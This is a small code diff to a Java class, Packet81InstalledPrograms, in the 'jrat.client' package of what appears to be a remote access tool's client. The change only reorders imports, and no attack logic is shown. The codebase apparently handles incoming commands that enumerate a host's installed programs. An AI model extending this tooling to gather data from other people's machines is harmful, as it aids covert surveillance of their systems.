@@ -2,11 +2,11 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet55InstalledProgram;
+import oslib.OperatingSystem;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
-
-import oslib.OperatingSystem;
 
 
 public class Packet81InstalledPrograms extends AbstractIncomingPacket {
